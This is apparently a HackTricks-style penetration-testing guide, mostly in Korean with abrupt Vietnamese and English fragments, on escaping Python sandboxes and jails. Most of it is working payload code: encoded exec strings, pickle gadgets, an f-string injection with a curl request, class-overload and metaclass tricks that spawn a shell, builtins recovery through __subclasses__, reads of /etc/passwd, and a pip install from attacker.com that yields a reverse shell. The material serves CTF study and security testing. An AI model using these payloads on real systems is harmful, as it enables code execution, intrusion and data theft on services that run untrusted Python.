# Python 샌드박스 우회

{{#include ../../../banners/hacktricks-training.md}}

Python 샌드박스 보호를 우회하고 임의의 명령을 실행하는 몇 가지 트릭입니다.<sup>[[1]](#references)[[2]](#references)</sup>

{{#ref}}
js2py-sandbox-escape-cve-2024-28397.md
{{#endref}}


## 명령 실행 라이브러리

먼저 이미 import된 라이브러리를 사용해 코드를 직접 실행할 수 있는지, 또는 다음 라이브러리 중 하나를 import할 수 있는지 알아야 합니다:

```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```

Remember rằng các hàm _**open**_ và _**read**_ có thể hữu ích để **đọc file** bên trong python sandbox và **viết một đoạn code** mà bạn có thể **thực thi** để **bypass** sandbox.

> [!CAUTION] > Hàm **Python2 input()** cho phép thực thi python code trước khi chương trình bị crash.

Python cố **load library từ thư mục hiện tại trước** (lệnh sau sẽ in ra nơi python đang load module): `python3 -c 'import sys; print(sys.path)'`

![Bypass Python sandboxes - Command Execution Libraries: Python cố load library từ thư mục hiện tại trước (lệnh sau sẽ in ra nơi python đang load module...](<../../../images/image (559).png>)

## Bypass pickle sandbox với các python package cài đặt mặc định

### Package mặc định

Bạn có thể tìm thấy **các package đã được cài đặt sẵn** tại đây: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
Lưu ý rằng bạn có thể dùng pickle để **import library bất kỳ** nào đã cài đặt trên hệ thống vào python env.\
Ví dụ: khi load pickle sau đây, nó sẽ import pip library để sử dụng:

```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
    def __reduce__(self):
        return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```

pickle 작동 방식에 대한 자세한 내용은 여기에서 확인하세요: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/).<sup>[[16]](#references)</sup>

### Pip 패키지

**@isHaacK**가 공유한 트릭

`pip` 또는 `pip.main()`에 접근할 수 있다면 임의의 패키지를 설치하고 다음을 호출해 reverse shell을 획득할 수 있습니다:

```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```

You can download the package to create the reverse shell here. Please, note that before using it you should **압축을 풀고, `setup.py`를 수정한 다음, reverse shell용 IP를 입력해야 합니다**:

{{#file}}
Reverse.tar (1).gz
{{#endfile}}

> [!TIP]
> 이 패키지의 이름은 `Reverse`입니다. 하지만 reverse shell을 종료하면 나머지 설치가 실패하도록 특별히 제작되었으므로, 종료할 때 **서버에 추가 Python 패키지가 설치된 채로 남지 않습니다**.

## Python 코드 Eval하기

> [!WARNING]
> exec은 여러 줄 문자열과 ";"를 허용하지만, eval은 허용하지 않는다는 점에 유의하세요(walrus 연산자 확인).

특정 문자가 금지된 경우 **hex/octal/B64** 표현을 사용해 제한을 **우회**할 수 있습니다:

```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```

### F-string 재평가 sinks

다른 매우 흔한 버그는 **공격자가 제어하는 데이터를 문자열에 삽입한 다음 해당 문자열을 f-string으로 평가하는 것**입니다. 이는 **Jinja/SSTI가 아닙니다**. Python 인터프리터는 두 번째 평가 단계에서 `{...}` 안에 있는 모든 내용을 실행합니다:<sup>[[10]](#references)</sup>

```python
def template(first, last, gender):
    text = f"Patient {first} {last} ({gender})"
    return eval(f"f'''{text}'''")
```

```python
s = "2+3"
eval(f"f'''{s}'''")
# '2+3'

s = "{2+3}"
eval(f"f'''{s}'''")
# '5'
```

따라서 중괄호, 따옴표, 점, 밑줄, 괄호가 허용된다면 다음과 같은 payload로 대개 명령 실행이 가능합니다:

```python
{__import__("os").popen("id").read()}
```

공백이나 셸 메타문자가 필터링되는 경우, 명령을 Base64로 인코딩한 뒤 표현식 내부에서 디코딩하세요:

```python
{__import__("os").popen(__import__("base64").b64decode("aWQK").decode()).read()}
```

유용한 탐색 패턴:

- `eval(f"f'''{user_input}'''")`
- `eval(f'f"{user_input}"')`
- 사용자 데이터를 사용해 템플릿을 만든 다음, 재구성된 문자열에 `eval`, `exec` 또는 `compile`을 호출하는 코드
- 정규식으로 문자를 검증하지만 `{}`와 따옴표는 허용하는 XML/JSON 핸들러

sink가 `request.data`에서 원시 XML/바이트를 파싱하는 Flask 엔드포인트 뒤에 있다면, `curl -d`는 기본적으로 `application/x-www-form-urlencoded`를 사용하므로 `request.data`가 비어 있을 수 있다는 점을 기억하세요. 대신 **폼이 아닌** content type을 사용하세요:

```bash
curl http://127.0.0.1:54321/addPatient \
  -X POST \
  -H 'Content-Type: application/xml' \
  -d '<patient><firstname>a</firstname><lastname>b</lastname><sender_app>app</sender_app><timestamp>1</timestamp><birth_date>01/01/2000</birth_date><gender>{2+3}</gender></patient>'
```

### Python 코드를 eval할 수 있게 하는 기타 라이브러리

```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```

PDF generator에서 실제로 발생한 sandbox evaluator 탈출 사례도 참고하세요:

- ReportLab/xhtml2pdf의 triple-bracket [[[...]]] 표현식 평가 → RCE (CVE-2023-33733). 평가된 속성(예: 글꼴 색상)에서 function.__globals__와 os.system에 접근하도록 rl_safe_eval을 악용하고, 렌더링을 안정적으로 유지하기 위해 유효한 값을 반환합니다.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

{{#ref}}
reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

## 연산자와 간단한 트릭

```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```

## 구조적 패턴 매칭을 통한 암묵적 속성 읽기

Python 3.10+에서 클래스 패턴은 먼저 `isinstance(subject, Class)`를 확인합니다. 위치 패턴의 경우 Python은 `Class.__match_args__`를 통해 위치를 매핑하고, 내부적으로 subject에서 해당 속성을 읽습니다.<sup>[[18]](#references)</sup>

`ast.Attribute` 읽기나 `getattr()` 호출만 거부하는 AST 필터는 이 `ast.MatchClass` 경로를 놓칠 수 있습니다. 이를 이용하려면 `match/case`가 허용되어야 하고, `__match_args__`를 변경할 수 있는 일치 대상 클래스가 있어야 합니다. 검사 대상 객체가 동일한 제한을 적용하는 proxy로 래핑된 경우에는 우회가 되지 않습니다.<sup>[[17]](#references)</sup>

예를 들어, 노출된 builtins에 `__build_class__`가 없어도 `namedtuple()`을 사용해 변경 가능한 클래스를 만들 수 있습니다. 리터럴 dunder 문자열이 필터링된다면 런타임에 이름을 만들면 됩니다. 아래 패턴은 제출된 속성 문법으로 읽지 않고 `__reduce_ex__`를 가져옵니다. 보고된 sandbox에서는 protocol 4를 사용했을 때 재구성 레시피의 첫 번째 요소로 실제 Python 함수인 `copyreg.__newobj__`가 반환되었습니다.<sup>[[17]](#references)</sup>

```python
from collections import namedtuple

def dunder(name):
    return chr(95)*2 + name + chr(95)*2

Record = namedtuple("Record", "value")
Record.__match_args__ = (dunder("reduce_ex"),)
match Record(1):
    case Record(reduce_method):
        function = reduce_method(4)[0]
print(function)  # <function __newobj__ ...>
```

두 번째 클래스 패턴은 `__globals__`를 읽기 전에 실제 함수와 일치해야 합니다. 보고된 `_safe_type()` 대체 구현은 `type(lambda: None)`에 대해 **변경 가능한 함수 타입 프록시**를 반환했지만, 이 프록시는 함수 인스턴스 검사를 통과했습니다. 이러한 안전하지 않은 프록시 동작이 있어야만 다음 과정에서 원래 `__builtins__` 딕셔너리와 그 안의 `__import__` 항목을 노출할 수 있습니다. 실제 불변 함수 타입은 이런 방식으로 수정할 수 없습니다. 이후의 import 및 명령 실행 기본 요소는 [builtins 복구](#builtins)를 참조하세요.<sup>[[17]](#references)</sup>

```python
FunctionProxy = type(lambda: None)  # vulnerable sandbox's replacement type()
FunctionProxy.__match_args__ = (dunder("globals"),)
match function:
    case FunctionProxy(module_globals):
        real_builtins = module_globals[dunder("builtins")]
        importer = real_builtins[dunder("import")]
```

## 인코딩을 통한 보호 우회 (UTF-7)

[**이 writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)에서는 UFT-7을 사용해 겉보기에는 sandbox인 환경 내부에서 임의의 python 코드를 로드하고 실행합니다:<sup>[[11]](#references)</sup>

```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
    return x
    #+AAo-print(open("/flag.txt").read())
""".lstrip()
```

다른 인코딩(예: `raw_unicode_escape` 및 `unicode_escape`)을 사용해 우회할 수도 있습니다.

## 호출 없이 Python 실행하기

**호출을 허용하지 않는** Python jail 안에 있더라도 **임의의 함수, 코드** 및 **명령어**를 실행할 수 있는 방법이 여전히 있습니다.

### [데코레이터](https://docs.python.org/3/glossary.html#term-decorator)를 사용한 RCE

```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
    pass

# The previous code is equivalent to:
class X:
    pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```

### 객체 생성 및 오버로딩을 통한 RCE

**클래스를 선언**하고 해당 클래스의 **객체를 생성**할 수 있다면, **직접 호출할 필요 없이** **트리거될 수 있는** 다양한 메서드를 **작성하거나 덮어쓸 수 있습니다**.

#### 사용자 정의 클래스를 이용한 RCE

일부 **클래스 메서드**(_기존 클래스 메서드를 덮어쓰거나 새 클래스를 만들어_)를 수정하면, 직접 호출하지 않아도 **트리거될 때 임의의 코드를 실행**하도록 만들 수 있습니다.

```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
    def __init__(self):
        self += "print('Hello from __init__ + __iadd__')"
    __iadd__ = exec #Triggered when object is created
    def __del__(self):
        self -= "print('Hello from __del__ + __isub__')"
    __isub__ = exec #Triggered when object is created
    __getitem__ = exec #Trigerred with obj[<argument>]
    __add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```

#### [메타클래스](https://docs.python.org/3/reference/datamodel.html#metaclasses)를 사용해 객체 만들기

메타클래스를 사용하면 대상 클래스를 메타클래스로 하는 새 클래스를 만들어, **생성자를 직접 호출하지 않고도 클래스의 인스턴스를 만들 수 있습니다.**<sup>[[15]](#references)</sup>

```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
    __getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
    pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```

#### 예외를 발생시켜 객체 만들기

**예외가 발생하면** 생성자를 직접 호출하지 않아도 **Exception** 객체가 **생성됩니다** ([**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)의 트릭):

```python
class RCE(Exception):
    def __init__(self):
        self += 'import os; os.system("sh")'
    __iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
  __add__ = exec

try:
  raise Klecko
except Klecko as k:
  k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```

### 추가 RCE

```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
    def __init__(self, a, b, c):
        self += "os.system('sh')"
    __iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
  def __init__(self, a, b, c, d, e):
    self += "print(open('flag').read())"
  __iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```

### builtins help & license를 사용해 파일 읽기

```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
```

## Builtins

- [**Python 2의 내장 함수**](https://docs.python.org/2/library/functions.html)
- [**Python 3의 내장 함수**](https://docs.python.org/3/library/functions.html)

**`__builtins__`** 객체에 접근할 수 있다면 라이브러리를 import할 수 있습니다(마지막 섹션에 나온 다른 문자열 표현을 사용할 수도 있습니다):

```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```

### Builtins가 없는 경우

`__builtins__`가 없으면 어떤 것도 import할 수 없고 파일을 읽거나 쓸 수도 없습니다. `open`, `import`, `print` 같은 **모든 전역 함수**가 **로드되지 않기 때문**입니다.\
하지만 **기본적으로 Python은 많은 모듈을 메모리에 import합니다**. 이런 모듈은 무해해 보일 수 있지만, 내부에서 **위험한** 기능을 import하는 경우도 있습니다. 이 기능에 접근하면 **임의 코드 실행**까지 할 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>

다음 예제에서는 로드된 "**무해한**" 모듈을 **악용**해 내부의 **위험한** **기능에 접근**하는 방법을 확인할 수 있습니다.

**Python2**

```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```

#### Python3

```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```

[**아래에는**](#recursive-search-of-builtins-globals) **builtins**를 찾을 수 있는 수십/**수백** 개의 **위치**를 찾는 더 큰 함수가 있습니다.

#### Python2 및 Python3

```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```

### Builtins payloads

```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```

## Globals and locals

**`globals`**와 **`locals`**를 확인하면 접근할 수 있는 항목을 파악하는 데 도움이 됩니다.

```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```

[**아래에는 더 큰 함수가 있습니다**](#recursive-search-of-builtins-globals). 이 함수는 **globals**를 찾을 수 있는 수십/**수백** 개의 **위치**를 찾아냅니다.

## 임의 코드 실행 탐색

여기서는 **로드된 더 위험한 기능을 추가로** 쉽게 탐색하는 방법을 설명하고, 더 신뢰할 수 있는 exploit을 제안하고자 합니다.

#### Bypass를 통한 subclasses 접근

이 technique에서 가장 민감한 부분 중 하나는 **base subclasses에 접근**할 수 있는 것입니다. 이전 예제에서는 `''.__class__.__base__.__subclasses__()`를 사용했지만, **다른 방법도 있습니다**:

```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```

### 로드된 위험한 라이브러리 찾기

예를 들어 **`sys`** 라이브러리를 사용하면 **임의의 라이브러리를 import할 수 있다**는 것을 알고 있다면, 내부에서 `sys`를 import한 **로드된 모든 모듈**을 검색할 수 있습니다:

```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```

많이 있지만, 명령을 실행하려면 **하나만** 있으면 됩니다:

```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```

**명령을 실행**하는 데 사용할 수 있다고 알려진 **다른 라이브러리**로도 같은 작업을 할 수 있습니다:

```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
